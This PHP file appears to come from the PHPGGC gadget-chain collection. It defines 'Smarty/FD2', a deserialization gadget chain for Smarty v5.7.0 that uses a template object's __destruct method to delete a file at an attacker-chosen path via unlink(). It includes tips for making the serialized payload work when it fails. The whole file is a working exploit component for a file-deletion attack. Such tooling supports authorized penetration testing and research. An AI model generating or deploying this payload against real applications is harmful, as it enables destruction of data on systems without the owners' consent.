<?php

namespace GadgetChain\Smarty;

class FD2 extends \PHPGGC\GadgetChain\FileDelete
{
    public static $version = 'v5.7.0';
    public static $vector = '__destruct';
    public static $author = 'quirmz';
    public static $information = 'Updated version of Smarty/FD/1 that deletes a file via \'unlink()\'. Generate gadget with the \'-a\' or \'-pub\' flag. If the payload does not work, manually remove \'r:<int>\', replace it with a simple serialized string like \'s:1:"b"\' and try using the modified payload.';
    public static $parameters = [
        'remote_path'
    ];

    public function generate(array $parameters)
    {
        return new \Smarty\Template($parameters['remote_path']);
    }
}

?>
